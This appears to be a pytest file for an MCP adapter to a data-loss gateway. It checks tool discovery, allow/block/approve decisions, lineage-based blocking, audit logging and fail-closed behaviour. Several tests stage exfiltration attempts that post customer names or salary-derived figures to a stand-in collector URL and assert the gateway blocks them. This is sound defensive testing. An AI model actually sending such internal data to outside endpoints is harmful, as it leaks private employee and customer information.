"""MCP adapter security tests (MCP extension kit, Person 2 / M1-T).

Every live test drives the REAL MCP stdio boundary: a spawned
`python -m mcp_gateway.server` subprocess speaking MCP to a real in-process
uvicorn TaskFence gateway. The gateway fixture is imported from
tests/test_dashboard_scenario_d.py (no duplicated infrastructure, no
production source modified); it isolates every store and the outbox to
tmp_path, so repo state is never touched.

The nine kit requirements:
1. exactly the five intended MCP tools are discoverable;
2. Scenario A -> send_slack ALLOW, exactly one Slack sink line;
3. Scenario B -> post_external BLOCK, external sink byte-unchanged;
4. Scenario C (C2 variant) -> derived salary BLOCKed through LINEAGE, with
   a keyword-free payload;
5. APPROVE returns approval_id, does NOT claim execution, sends nothing;
6. search_drive returns metadata candidates only — never bulk content;
7. MCP activity lands in the EXISTING audit_events trail;
8. mcp_gateway/ has no direct imports of taskfence.policy/lineage/tools/
   audit (static AST check);
9. gateway unavailable -> structured fail-closed result, nothing executed.
"""

import ast
import asyncio
import json
import os
import sys
from pathlib import Path

import httpx
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))
from test_dashboard_scenario_d import real_gateway  # noqa: E402,F401

REPO_ROOT = Path(__file__).resolve().parents[1]
SERVER_CMD = str(REPO_ROOT / ".venv" / "bin" / "python")
TASK = "Summarize Q3 sales and post it to #sales."
EXPECTED_TOOLS = {"read_file", "search_drive", "query_crm", "send_slack",
                  "post_external"}


def _env(base_url: str) -> dict:
    return {"PATH": os.environ.get("PATH", "/usr/bin:/bin"),
            "HOME": os.environ.get("HOME", "/tmp"),
            "PYTHONPATH": str(REPO_ROOT),
            "TASKFENCE_URL": base_url,
            "TASKFENCE_MCP_TIMEOUT": "10"}


def _mcp(base_url: str, tool: str, args: dict) -> dict:
    """One tool call over the real stdio boundary; returns the parsed JSON
    result text the adapter produced."""
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client

    async def _run() -> dict:
        params = StdioServerParameters(
            command=SERVER_CMD, args=["-m", "mcp_gateway.server"],
            env=_env(base_url))
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                result = await session.call_tool(tool, args)
        text = result.content[0].text if result.content else ""
        return json.loads(text)

    return asyncio.run(_run())


def _list_tools(base_url: str) -> set[str]:
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client

    async def _run() -> set[str]:
        params = StdioServerParameters(
            command=SERVER_CMD, args=["-m", "mcp_gateway.server"],
            env=_env(base_url))
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                return {t.name for t in (await session.list_tools()).tools}

    return asyncio.run(_run())


def _sink(sink: str) -> bytes:
    from taskfence import registry
    path = registry.OUTBOX_DIR / registry.SINKS[sink]
    return path.read_bytes() if path.exists() else b""


# --- 1. discoverability -----------------------------------------------------


def test_exactly_the_five_intended_tools_are_discoverable(real_gateway):
    assert _list_tools(real_gateway) == EXPECTED_TOOLS


# --- 2. Scenario A ----------------------------------------------------------


def test_scenario_a_send_slack_allowed_exactly_one_sink_line(real_gateway):
    result = _mcp(real_gateway, "send_slack", {
        "task_text": TASK, "channel": "#sales",
        "text": "Q3: steady growth across all regions.",
        "source_assets": ["sales_report_q3"]})
    assert result["decision"] == "ALLOW", result
    assert result["executed"] is True
    assert result["result"]["delivered"] is True
    lines = _sink("slack_sales").splitlines()
    assert len(lines) == 1, lines  # exactly one delivery
    assert b"Q3: steady growth" in lines[0]
    assert _sink("external_api") == b""


# --- 3. Scenario B ----------------------------------------------------------


def test_scenario_b_post_external_blocked_sink_unchanged(real_gateway):
    before = _sink("external_api")
    result = _mcp(real_gateway, "post_external", {
        "task_text": TASK, "url": "https://collect.example.invalid/ingest",
        "payload": "customers: alice, bob",
        "source_assets": ["customer_db"]})
    assert result["decision"] == "BLOCK", result
    assert result["executed"] is False
    assert _sink("external_api") == before  # byte-identical


# --- 4. Scenario C: lineage, not keywords -----------------------------------


def test_scenario_c_derived_salary_blocked_through_lineage(real_gateway):
    task_args = {"task_text": TASK}
    read_result = _mcp(real_gateway, "read_file",
                       {**task_args, "asset_id": "employee_salary"})
    assert read_result["decision"] == "ALLOW", read_result  # allow-but-taint
    # Keyword-free payload: "Quarterly aggregate: 42" contains NO salary
    # terms — the BLOCK must come from inherited EMPLOYEE_DATA/FINANCIAL.
    before = _sink("external_api")
    result = _mcp(real_gateway, "post_external", {
        **task_args, "url": "https://collect.example.invalid/ingest",
        "payload": "Quarterly aggregate: 42",
        "source_assets": ["employee_salary"]})
    assert result["decision"] == "BLOCK", result
    assert result["executed"] is False
    assert _sink("external_api") == before


# --- 5. APPROVE semantics ----------------------------------------------------


def test_approve_returns_approval_id_and_does_not_execute(real_gateway):
    before = _sink("slack_sales")
    result = _mcp(real_gateway, "send_slack", {
        "task_text": TASK, "channel": "#sales",
        "text": "regional conversion: 42%",
        "source_assets": ["customer_db"]})  # customer data -> not in scope
    assert result["decision"] == "APPROVE", result
    assert result["approval_id"], result
    assert result["executed"] is False  # never claims execution
    assert "human" in result["how_to_proceed"].lower()
    assert _sink("slack_sales") == before  # nothing sent


# --- 6. search is discovery, not permission ---------------------------------


def test_search_drive_returns_metadata_never_bulk_content(real_gateway):
    result = _mcp(real_gateway, "search_drive",
                  {"task_text": TASK, "query": "salary"})
    assert result["count"] >= 1
    for candidate in result["candidates"]:
        # Exactly the registry metadata keys — no "content", no labels dump:
        assert set(candidate) == {"asset_id", "path", "source", "data_group"}
        assert "EMPLOYEE_DATA" not in json.dumps(candidate)
    # Restricted file contents are NOT in the search result:
    assert "salary" not in json.dumps(result).replace(
        "employee_salary", "").replace("employee_salary.csv", "")


# --- 7. one audit trail ------------------------------------------------------


def test_mcp_activity_lands_in_existing_audit_trail(real_gateway):
    _mcp(real_gateway, "send_slack", {
        "task_text": TASK, "text": "audit me",
        "source_assets": ["sales_report_q3"]})
    _mcp(real_gateway, "post_external", {
        "task_text": TASK, "url": "https://collect.example.invalid/ingest",
        "payload": "x", "source_assets": ["customer_db"]})
    events = httpx.get(f"{real_gateway}/audit", timeout=10).json()["events"]
    decisions = [event["decision"] for event in events]
    assert decisions == ["ALLOW", "BLOCK"], events
    assert [event["tool"] for event in events] == ["send_slack",
                                                   "post_external"]
    # Every MCP-driven call is fully identified in the one existing trail:
    for event in events:
        assert event["task_id"].startswith("task-")
        assert event["contract_version"]
        assert "lineage_path" in event and "action" in event
    # Denials carry the real policy reasons (ALLOWs carry none by engine
    # convention — their explanation lives in explain.py output):
    assert events[1]["reasons"], events[1]


# --- 8. static import ban ----------------------------------------------------


def test_mcp_code_never_imports_security_modules_static():
    banned_suffixes = (".policy", ".lineage", ".tools", ".audit")
    offenders: list[str] = []
    for path in sorted(Path("mcp_gateway").glob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            names = []
            if isinstance(node, ast.Import):
                names = [alias.name for alias in node.names]
            elif isinstance(node, ast.ImportFrom):
                names = [node.module or ""]
            for name in names:
                if any(name == f"taskfence{suffix}"
                       or name.endswith(f"taskfence{suffix}")
                       for suffix in banned_suffixes):
                    offenders.append(f"{path}: {name}")
    assert offenders == [], offenders


# --- 9. fail closed ----------------------------------------------------------


def test_gateway_unavailable_fails_closed(real_gateway):
    dead = real_gateway  # real base replaced by a dead port below
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client

    async def _run() -> dict:
        params = StdioServerParameters(
            command=SERVER_CMD, args=["-m", "mcp_gateway.server"],
            env=_env("http://127.0.0.1:9"))  # nothing listens here
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                result = await session.call_tool("send_slack", {
                    "task_text": TASK, "text": "should never run"})
        return json.loads(result.content[0].text)

    result = asyncio.run(_run())
    assert result["error"] == "gateway_unavailable", result
    assert result["decision"] is None   # NO local decision was invented
    assert result["executed"] is False  # nothing was executed
    assert dead  # the live-gateway fixture guaranteed isolation until here
